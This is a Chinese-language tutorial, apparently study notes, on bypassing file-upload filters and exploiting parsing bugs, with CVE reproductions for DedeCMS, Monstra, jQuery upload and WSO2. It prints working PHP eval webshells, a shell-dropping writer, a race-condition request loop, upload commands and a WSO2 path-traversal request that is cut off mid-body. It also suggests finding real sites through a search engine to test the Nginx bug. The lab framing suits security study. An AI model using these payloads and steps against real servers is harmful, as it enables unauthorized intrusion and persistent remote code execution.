<h3 id="特殊扩展名绕过"><a href="#特殊扩展名绕过" class="headerlink" title="特殊扩展名绕过"></a>特殊扩展名绕过</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>由于历史原因，部分解释器可能支持符合正则 /ph(p[2-7]?|t(ml)?)/ 的后缀，如 php / php5 / pht / phtml / shtml / pwml / phtm 等 可在禁止上传php文件时测试该类型。</p>
<h4 id="演示-1"><a href="#演示-1" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 <strong>Linux</strong></p>
<p>工具：Burpsuit</p>
<p>关卡：Pass-03</p>
<p>此关卡中，网站只过滤 .asp|.aspx|.php|.jsp 后缀文件。</p>
<ol>
<li><p>将木马php文件扩展名改成 .phtml</p>
</li>
<li><p>直接上传 .phtml 文件</p>
</li>
<li><p>上传成功后访问</p>
</li>
</ol>
<h3 id="htaccess绕过"><a href="#htaccess绕过" class="headerlink" title="htaccess绕过"></a>htaccess绕过</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>.htaccess文件 (或者“分布式配置文件”）,全称是 Hypertext Access(超文本入口)。</p>
<p>提供了针对目录改变配置的方法，即在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 Apache的AllowOverride指令来设置。</p>
<p><strong>.htaccess</strong>在文件上传中最大作用就是 可以使任何类型文件作为 php解析，该文件在 Apache里默认是启用的。</p>
<h4 id="演示-2"><a href="#演示-2" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 <strong>Linux</strong></p>
<p>工具：Burpsuit</p>
<p>关卡：Pass-04</p>
<p>此关卡中，网站过滤黑名单中没有 .htaccess。</p>
<ol>
<li>准备一个 a.htaccess 文件，内容如下：</li>
</ol>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">SetHandler application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li>使用bp抓包上传 a.htaccess，并在上传时将名称改成 .htaccess</li>
</ol>
<p><img src="/2023/012220963/78.PNG" alt="78"></p>
<ol start="2">
<li>将php木马修改名称，改成随意的扩展名，如 shell.ppp，并直接上传</li>
<li>访问 shell.ppp，解析成功</li>
</ol>
<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>网站在过滤扩展名时，如果没有将字符串统一大小写后再进行比较的话，可以通过修改扩展名大小写的方式绕过。</p>
<h4 id="演示-3"><a href="#演示-3" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 <strong>Linux</strong></p>
<p>工具：Burpsuit</p>
<p>关卡：Pass-06</p>
<p>此关卡中，网站过滤黑名单没有验证大小写。</p>
<ol>
<li><p>将php的木马，修改扩展名为 phP</p>
</li>
<li><p>上传此文件，直接解析成功</p>
</li>
</ol>
<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><h4 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h4><p>在Windows中，文件首位如果有空格，系统会默认去除。</p>
<p>如：”example.php “ 文件会被修改成：”example.php”</p>
<p>但是在服务器字符串匹配时，”.php “ 与 “.php”匹配不成功，即可绕过。</p>
<h4 id="演示-4"><a href="#演示-4" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 <strong>Windows</strong></p>
<p>工具：Burpsuit</p>
<p>关卡：Pass-07</p>
<p>此关卡中，网站过滤黑名单没有去除首尾空格。</p>
<ol>
<li><p>上传php木马，使用bp抓包</p>
</li>
<li><p>修改文件名，在某尾加上一些空格</p>
</li>
</ol>
<p><img src="/2023/012220963/79.PNG" alt="79"></p>
<ol start="3">
<li>解析成功</li>
</ol>
<h3 id="点号绕过"><a href="#点号绕过" class="headerlink" title="点号绕过"></a>点号绕过</h3><h4 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h4><p>在windows中，文件名最末尾的 点不会被解析</p>
<h4 id="演示-5"><a href="#演示-5" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 <strong>Windows</strong></p>
<p>工具：Burpsuit</p>
<p>关卡：Pass-08</p>
<p>此关卡中，网站过滤黑名单没有去除末尾的点。</p>
<ol>
<li><p>上传php木马，使用bp抓包</p>
</li>
<li><p>修改文件名，在某尾加上一个点</p>
</li>
<li><p>解析成功</p>
</li>
</ol>
<h3 id="点-空格-点绕过"><a href="#点-空格-点绕过" class="headerlink" title="点+空格+点绕过"></a>点+空格+点绕过</h3><h4 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h4><p>PHP中的 deldot()函数会删除字符串中的点，但是该函数检测到末尾的第一个点之后，会删除，并且继续检测。如果遇到空格则会停止删除。构造 点 空格 点 即可进行绕过</p>
<h4 id="演示-6"><a href="#演示-6" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 <strong>Windows</strong></p>
<p>工具：Burpsuit</p>
<p>关卡：Pass-10</p>
<p>此关卡中，网站过滤黑名单使用deldot()函数删除末尾的点。</p>
<ol>
<li><p>上传php木马，使用bp抓包</p>
</li>
<li><p>修改文件名，在某尾加上 点 空格 点</p>
</li>
</ol>
<p><img src="/2023/012220963/80.PNG" alt="80"></p>
<ol start="3">
<li>解析成功</li>
</ol>
<h3 id="特殊字符-DATA绕过"><a href="#特殊字符-DATA绕过" class="headerlink" title="特殊字符:$DATA绕过"></a>特殊字符:$DATA绕过</h3><h4 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h4><p>在 window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持”::$DATA”之前的文件名他的目的就是不检查后缀名。</p>
<p>如：a.php::$DATA 与 a.php 等价</p>
<h4 id="演示-7"><a href="#演示-7" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 <strong>Windows</strong></p>
<p>工具：Burpsuit</p>
<p>关卡：Pass-09</p>
<p>此关卡中，网站过滤黑名单没有检测::$DATA。</p>
<ol>
<li><p>上传php木马，使用bp抓包</p>
</li>
<li><p>修改文件名，在某尾加上 ::$DATA</p>
</li>
</ol>
<p><img src="/2023/012220963/81.PNG" alt="81"></p>
<ol start="3">
<li>上传成功，在访问时去除::$DATA即可</li>
</ol>
<p><img src="/2023/012220963/82.PNG" alt="82"></p>
<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><h4 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h4><p>PHP中 str_ireplace(find,replace,string,count) 函数替换字符串中的一些字符（不区分大小写）且只能去除一次。</p>
<p>如果后端服务器在验证扩展名时，没有递归替换扩展名的话，可以使用双写扩展名的方式进行绕过。</p>
<h4 id="演示-8"><a href="#演示-8" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 <strong>Windows</strong>&amp;<strong>Linux</strong></p>
<p>工具：Burpsuit</p>
<p>关卡：Pass-11</p>
<p>此关卡中，网站过滤黑名单没有递归删除扩展名。</p>
<ol>
<li><p>上传php木马，使用bp抓包</p>
</li>
<li><p>修改文件名扩展名，改为 .pphphp</p>
</li>
</ol>
<p><img src="/2023/012220963/83.PNG" alt="83"></p>
<ol start="3">
<li>上传成功，并且可直接访问解析</li>
</ol>
<p><strong>注意</strong>：不要改成 <strong>php</strong>hpp，否则会被替换后扩展名会变成 hpp</p>
<h3 id="00截断-GET"><a href="#00截断-GET" class="headerlink" title="00截断-GET"></a>00截断-GET</h3><h4 id="原理-9"><a href="#原理-9" class="headerlink" title="原理"></a>原理</h4><p>php的一些函数的底层是 C语言，C语言的字符串中，如果遇到0x00会被编译器认为是字符串结束标志，会把该字符串截断。0x表示 16进制，URL中%00解码成 16进制就是 0x00。可以构造名字带有%00木马上传，进行绕过</p>
<h4 id="演示-9"><a href="#演示-9" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 <strong>Windows</strong></p>
<p>工具：Burpsuit</p>
<p>关卡：Pass-12</p>
<p>必要配置：</p>
<ul>
<li><p>php 版本 &lt;5.3.4 才可以进行00截断</p>
</li>
<li><p>magic_quotes_gpc = Off（改文件在php.ini配置文件中）</p>
</li>
</ul>
<ol>
<li>上传php木马，使用bp抓包</li>
<li>修改 save_path=../upload/shell.php%00 、 filename=a.png</li>
</ol>
<p><img src="/2023/012220963/84.PNG" alt="84"></p>
<ol start="3">
<li>访问 shell.php即可</li>
</ol>
<h3 id="00截断-POST"><a href="#00截断-POST" class="headerlink" title="00截断-POST"></a>00截断-POST</h3><h4 id="原理-10"><a href="#原理-10" class="headerlink" title="原理"></a>原理</h4><p>原理同GET方式，只不过传参方式为POST</p>
<h4 id="演示-10"><a href="#演示-10" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 <strong>Windows</strong></p>
<p>工具：Burpsuit</p>
<p>关卡：Pass-13</p>
<p>必要配置：</p>
<ul>
<li><p>php 版本 &lt;5.3.4 才可以进行00截断</p>
</li>
<li><p>magic_quotes_gpc = Off（改文件在php.ini配置文件中）</p>
</li>
</ul>
<ol>
<li><p>上传php木马，使用bp抓包</p>
</li>
<li><p>修改 ../upload/shell.php.png filename=shell.png</p>
</li>
</ol>
<p><img src="/2023/012220963/85.PNG" alt="85"></p>
<ol start="3">
<li>添加%00</li>
</ol>
<p>​    在光标位置输入一个空格，并选中它，在右边改为00</p>
<p><img src="/2023/012220963/86.PNG" alt="86"></p>
<ol start="4">
<li>上传成功，访问 shell.php即可</li>
</ol>
<h2 id="文件上传-图片马及文件解析漏洞利用"><a href="#文件上传-图片马及文件解析漏洞利用" class="headerlink" title="文件上传-图片马及文件解析漏洞利用"></a>文件上传-图片马及文件解析漏洞利用</h2><h3 id="图片马的制作与利用"><a href="#图片马的制作与利用" class="headerlink" title="图片马的制作与利用"></a>图片马的制作与利用</h3><h4 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h4><p>图片马就是在图片中隐藏一句话木马，使用正常的图片上传功能将该图片马上传至服务器后，再利用htaccess、文件包含漏洞或者解析漏洞即可发挥作用。</p>
<p>注：单纯的上传图片马并不会发挥作用，必须配合其他漏洞。</p>
<h4 id="图片马制作"><a href="#图片马制作" class="headerlink" title="图片马制作"></a>图片马制作</h4><p>注意事项：</p>
<ul>
<li><p>图片大小不宜过大</p>
</li>
<li><p>尽量为一句话木马</p>
</li>
</ul>
<p>制作命令：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">copy <span class="token number">1.</span>jpg<span class="token operator">/</span>b <span class="token operator">+</span> <span class="token number">2.</span>php<span class="token operator">/</span>a <span class="token number">3.</span>jpg <span class="token comment"># b-->二进制;a-->ascii,图片可加绝对路径</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/012220963/87.PNG" alt="87"></p>
<h4 id="图片马绕过"><a href="#图片马绕过" class="headerlink" title="图片马绕过"></a>图片马绕过</h4><p>环境：uplo-labs靶场 <strong>Linux</strong></p>
<p>工具：Burpsuit</p>
<p>关卡：Pass-14</p>
<p>此关卡中，网站检查图标内容开头2个字节！</p>
<ol>
<li><p>将木马直接上传</p>
</li>
<li><p>上传成功后访问</p>
</li>
</ol>
<p>​        <a target="_blank" rel="noopener" href="http://192.168.111.136:8089/include.php?file=upload/5820230314052947.jpg">phpinfo()</a></p>
<p>其中：upload/5820230314052947.jpg，将上传的文件在新的标签页中打开，url中存在该链接</p>
<h4 id="条件竞争绕过"><a href="#条件竞争绕过" class="headerlink" title="条件竞争绕过"></a>条件竞争绕过</h4><p>条件竞争是代码逻辑存在问题，代码执行逻辑为：服务器先将上传的文件保存在临时目录中，然后再对后缀名进行白名单验证。如果符合白名单的要求，并重命名，但如果不符合白名单的要求，就会被删除掉。</p>
<p>代码删除文件是需要耗费时间的，如果我们能够在文件被删除之前就访问到了此文件，那么即使删除了也无所谓。这个过程就叫做条件竞争。</p>
<p>环境：upload-labs靶场 <strong>Linux</strong></p>
<p>工具：Burpsuit</p>
<p>关卡：Pass-18，17关也可以</p>
<ol>
<li>分析代码</li>
</ol>
<p>​        服务器先将上传的文件保存下来，然后通过白名单进行比较。如果为jpg、png、gif中的一种，就将文件进行重命名，如果不符合则删除该文件。</p>
<ol start="2">
<li>准备php特殊马(写入马)</li>
</ol>
<p>shell.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php eval($_POST[1]); phpinfo(); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<ol start="3">
<li>准备批量访问脚本</li>
</ol>
<p>test1.py</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
url <span class="token operator">=</span> <span class="token string">"http://ip:端口/upload/shell.php"</span>
<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
	requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="4">
<li>上传shell.php，进行抓包，将抓到的包发给Intruder模块</li>
<li>设置payload</li>
</ol>
<p><img src="/2023/012220963/89.PNG" alt="89"></p>
<ol start="6">
<li><p><strong>执行</strong>python脚本，<strong>开启</strong>burp爆破(存在先后顺序)</p>
</li>
<li><p>访问链接：<a href="http://ip:端口/upload/a.php">http://ip:端口/upload/a.php</a></p>
</li>
</ol>
<p>如果出现 phpinfo页面，则说明条件竞争执行成功，退出脚本和爆破</p>
<ol start="8">
<li>使用antsword链接一句话木马即可</li>
</ol>
<h3 id="文件解析漏洞利用"><a href="#文件解析漏洞利用" class="headerlink" title="文件解析漏洞利用"></a>文件解析漏洞利用</h3><h4 id="Apache-HTTPD解析漏洞"><a href="#Apache-HTTPD解析漏洞" class="headerlink" title="Apache HTTPD解析漏洞"></a>Apache HTTPD解析漏洞</h4><p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。</p>
<p>在有多个后缀的情况下，只要一个文件含有.php后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。</p>
<p>如：a.php.jpg 文件会被当成 php文件执行</p>
<p>利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p>
<h5 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h5><p>docker镜像：vulfocus/httpd-apache_parsing_vulnerability:latest</p>
<p>启动环境：</p>
<pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">docker pull vulfocus&#x2F;httpd-apache_parsing_vulnerability:latest

docker run -d -p 8081:80 vulfocus&#x2F;httpd-apache_parsing_vulnerability:latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>创建一个名为：a.php.jpg的图片</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用普通的方式上传上去，访问即可</p>
<p>http//ip:端口/uploadfiles/a.php.jpg(我的地址)</p>
<h4 id="Nginx解析漏洞-未成功"><a href="#Nginx解析漏洞-未成功" class="headerlink" title="Nginx解析漏洞(未成功)"></a>Nginx解析漏洞(未成功)</h4><p>影响版本：</p>
<p>nginx 1.x</p>
<p>php 7.x</p>
<h5 id="漏洞环境-1"><a href="#漏洞环境-1" class="headerlink" title="漏洞环境"></a>漏洞环境</h5><p>Vulhub：<a target="_blank" rel="noopener" href="https://vulhub.org/">https://vulhub.org/</a></p>
<p>vulhub：nginx/nginx_parsing_vulnerability</p>
<p>启动环境：docker-compose up -d</p>
<ul>
<li><p>制作图片马</p>
</li>
<li><p>上传图片马，保存路径</p>
<p>访问图片的地址，在地址的后面加上 /.php</p>
</li>
</ul>
<p>漏洞查找</p>
<p>搜索引擎：inurl:php</p>
<p>找到访问网站，在后面添加 /.php 测试即可</p>
<h4 id="Apache-CVE-2017-15715"><a href="#Apache-CVE-2017-15715" class="headerlink" title="Apache CVE-2017-15715"></a>Apache CVE-2017-15715</h4><p>Apache换行解析漏洞 。于 apache 在修复第一个后缀名解析漏洞时，用正则来匹配后缀。在解析 php时 xxx.php\x0A 将被按照 php 后缀进行解析，导致绕过一些服务器的安全策略。</p>
<p>影响版本：2.4.0 ~ 2.4.29</p>
<h5 id="漏洞环境-2"><a href="#漏洞环境-2" class="headerlink" title="漏洞环境"></a>漏洞环境</h5><p>vulhub：httpd/CVE-2017-15715</p>
<p>启动环境：docker-compose up -d</p>
<p>上传1.php文件，并且拦截，发送至重发器</p>
<p>在重发器中，将文件名改成 a.php**%0a**</p>
<p><strong>0a</strong>要使用16进制的方式添加进去</p>
<p><img src="/2023/012220963/90.PNG" alt="90"></p>
<p>之后把包发送出去，返回值 200</p>
<p>访问 /evil.php%0a 即可解析成功</p>
<p><img src="/2023/012220963/91.PNG" alt="91"></p>
<h4 id="Nginx-CVE-2013-4547"><a href="#Nginx-CVE-2013-4547" class="headerlink" title="Nginx CVE-2013-4547"></a>Nginx CVE-2013-4547</h4><p>Nginx文件名逻辑解析漏洞</p>
<p>Nginx错误地解析了请求的URL,错误地获取到用户请求的文件名,导致出现权限绕过、代码执行的连带影响。</p>
<p>上传名为 a.jpg 的PHP文件，抓包后在文件名称末尾拼接 16进制的 0x20 0x00 即可解析</p>
<p>影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</p>
<h5 id="漏洞环境-3"><a href="#漏洞环境-3" class="headerlink" title="漏洞环境"></a>漏洞环境</h5><p>vulhub：nginx/CVE-2013-4547</p>
<p>启动环境：docker-compose up -d</p>
<p>上传一个 c.jpg 文件，抓包修改文件名，后面加上空格，内容如下：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>再抓一个访问index的GET方式的包，访问 /uploadfiles/c.jpg[0x20][0x00].php 即可</p>
<p>0x20 和 0x00 为16进制</p>
<p><img src="/2023/012220963/92.PNG" alt="92"></p>
<p>真实利用时，可以使用PHP代码写入一个木马</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php @eval($_POST[1]); phpinfo(); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="大马分享"><a href="#大马分享" class="headerlink" title="大马分享"></a>大马分享</h3><p><a target="_blank" rel="noopener" href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p>
<h2 id="CMS漏洞测试练习"><a href="#CMS漏洞测试练习" class="headerlink" title="CMS漏洞测试练习"></a>CMS漏洞测试练习</h2><h3 id="CVE-2019-8933-dedecms文件上传"><a href="#CVE-2019-8933-dedecms文件上传" class="headerlink" title="CVE-2019-8933 dedecms文件上传"></a>CVE-2019-8933 dedecms文件上传</h3><p>DedeCMS 5.7SP2版本中存在安全漏洞。远程攻击者可通过在添加新模板时，将文件名../index.html更改成../index.php利用该漏洞向uploads/目录上传.php文件并执行该文件。</p>
<p>影响版本：DedeCMS 5.7SP2</p>
<h4 id="漏洞环境-4"><a href="#漏洞环境-4" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>环境：vulfocus/dedecms-cve_2019_8933:latest</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">docker pull vulfocus<span class="token operator">/</span>dedecms<span class="token operator">-</span>cve_2019_8933<span class="token punctuation">:</span>latest

docker run <span class="token operator">-</span>d <span class="token operator">-</span>p <span class="token number">8081</span><span class="token punctuation">:</span><span class="token number">80</span> vulfocus<span class="token operator">/</span>dedecms<span class="token operator">-</span>cve_2019_8933<span class="token punctuation">:</span>latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>后台路径：/uploads/dede/ 后台密码：admin:admin</p>
<p>模板=&gt;默认模板管理=&gt;新建模板</p>
<p><img src="/2023/012220963/93.png" alt="93"></p>
<p>在新建模板中写入一句话木马，并保存最为.htm格式</p>
<p>之后进行一下操作：</p>
<p><img src="/2023/012220963/94.png" alt="94"></p>
<p>即上传完成，可以点击浏览查看效果，之后可以使用webshell工具进行连接。</p>
<h3 id="CVE-2020-13384-Monstra文件上传"><a href="#CVE-2020-13384-Monstra文件上传" class="headerlink" title="CVE-2020-13384 Monstra文件上传"></a>CVE-2020-13384 Monstra文件上传</h3><h4 id="漏洞环境-5"><a href="#漏洞环境-5" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>环境：vulfocus/monstra_cve_2020_13384:latest</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">docker pull vulfocus<span class="token operator">/</span>monstra_cve_2020_13384<span class="token punctuation">:</span>latest

docker run <span class="token operator">-</span>d <span class="token operator">-</span>p <span class="token number">8080</span><span class="token punctuation">:</span><span class="token number">80</span> vulfocus<span class="token operator">/</span>monstra_cve_2020_13384<span class="token punctuation">:</span>latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><ol>
<li><p>初始化环境</p>
</li>
<li><p>登录管理员页面，找到文件上传页面</p>
</li>
</ol>
<p>​    <a href="http://ip:端口号/admin/index.php?id=filesmanager(我的文件上传地址)">http://ip:端口号/admin/index.php?id=filesmanager(我的文件上传地址)</a></p>
<ol start="3">
<li>准备一个php木马文件，选择并上传</li>
<li>点击上传时，提示文件类型不允许上传</li>
<li>多次测试文件扩展名，最终确定 .phar 可以上传</li>
<li>上传 phar的php木马</li>
<li>访问该文件，文件上传成功</li>
</ol>
<p>​    <a href="http://ip:端口号/public/uploads/a.phar">http://ip:端口号/public/uploads/a.phar</a></p>
<ol start="8">
<li>将文件内容修改为一句话木马，即可使用Webshell管理工具进行管理</li>
</ol>
<p><strong>如何批量测试扩展名是否不在黑名单内？</strong></p>
<p>​    抓上传页面的包，之后把包放入Inturder,之后选中扩展名进行爆破即可</p>
<p><img src="/2023/012220963/95.PNG" alt="95"></p>
<p><strong>推荐扩展名爆破脚本</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/TheKingOfDuck/fuzzDicts"> Fuzz 字典</a></p>
<h3 id="CVE-2018-9207-jQuery文件上传"><a href="#CVE-2018-9207-jQuery文件上传" class="headerlink" title="CVE-2018-9207 jQuery文件上传"></a>CVE-2018-9207 jQuery文件上传</h3><h4 id="漏洞环境-6"><a href="#漏洞环境-6" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>环境：vulfocus/jquery-cve_2018_9207:latest</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">docker pull vulfocus<span class="token operator">/</span>jquery<span class="token operator">-</span>cve_2018_9207<span class="token punctuation">:</span>latest

docker run <span class="token operator">-</span>d <span class="token operator">-</span>p <span class="token number">8080</span><span class="token punctuation">:</span><span class="token number">80</span> vulfocus<span class="token operator">/</span>jquery<span class="token operator">-</span>cve_2018_9207<span class="token punctuation">:</span>latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><ol>
<li>准备一个php木马</li>
</ol>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span> #命名为shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li>上传</li>
</ol>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">curl <span class="token operator">-</span><span class="token constant">F</span> <span class="token string double-quoted-string">"myfile=@shell.php"</span> <span class="token string double-quoted-string">"http://ip:8080/jquery-upload-file/php/upload.php"</span> <span class="token comment">#命令行上传即可</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="3">
<li>验证木马</li>
</ol>
<p><a target="_blank" rel="noopener" href="http://ip:8080/jquery-upload-file/php/upload/shell.php">http://ip:8080/jquery-upload-file/php/upload/shell.php</a></p>
<h3 id="CVE-2022-29464-WSO2-文件上传-未成功"><a href="#CVE-2022-29464-WSO2-文件上传-未成功" class="headerlink" title="CVE-2022-29464 WSO2 文件上传(未成功)"></a>CVE-2022-29464 WSO2 文件上传(未成功)</h3><p>WSO2是一家成立于 2005 年的开源技术提供商。它提供了一个企业平台，用于在本地和整个 Internet 上 集成应用程序编程接口(API)、应用程序和 Web 服务。</p>
<p>某些 WSO2 产品允许无限制的文件上传和远程代码执行。</p>
<h4 id="漏洞环境-7"><a href="#漏洞环境-7" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>环境：vulfocus/jquery-cve_2018_9207:latest</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">docker pull vulfocus<span class="token operator">/</span>wso2<span class="token operator">-</span>cve_2022_29464<span class="token punctuation">:</span>latest

docker run <span class="token operator">-</span>d <span class="token operator">-</span>p <span class="token number">9443</span><span class="token punctuation">:</span><span class="token number">9443</span> vulfocus<span class="token operator">/</span>wso2<span class="token operator">-</span>cve_2022_29464<span class="token punctuation">:</span>latest

<span class="token comment"># https://ip:9443</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p><strong>漏洞复现</strong></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lwh01/p/16193991.html">https://www.cnblogs.com/lwh01/p/16193991.html</a></p>
<ol>
<li><p>访问链接 <a target="_blank" rel="noopener" href="https://ip:9443/">https://ip:9443</a></p>
</li>
<li><p>构造以下数据包Poc</p>
</li>
</ol>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span>fileupload<span class="token operator">/</span>toolsAny HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> ip<span class="token punctuation">:</span><span class="token number">9443</span>
Accept<span class="token punctuation">:</span> <span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span>
Accept<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip<span class="token punctuation">,</span> deflate
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">889</span>
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> multipart<span class="token operator">/</span>form<span class="token operator">-</span>data<span class="token punctuation">;</span> boundary<span class="token operator">=</span>4ef9f369a86bfaadf5ec3177278d49c0
User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> python<span class="token operator">-</span>requests<span class="token operator">/</span><span class="token number">2.22</span><span class="token number">.0</span>
<span class="token operator">-</span><span class="token operator">-</span>4ef9f369a86bfaadf5ec3177278d49c0
Content<span class="token operator">-</span>Disposition<span class="token punctuation">:</span> form<span class="token operator">-</span>data<span class="token punctuation">;</span> 
name<span class="token operator">=</span>"<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>repository<span class="token operator">/</span>deployment<span class="token operator">/</span>server<span class="token operator">/</span>webapps<span class="token operator">/</span>authenticationendpoint<span class="token operator">/</span><span class="token number">1</span><span class="token punctuation">.</span>
jsp"<span class="token punctuation">;</span> 
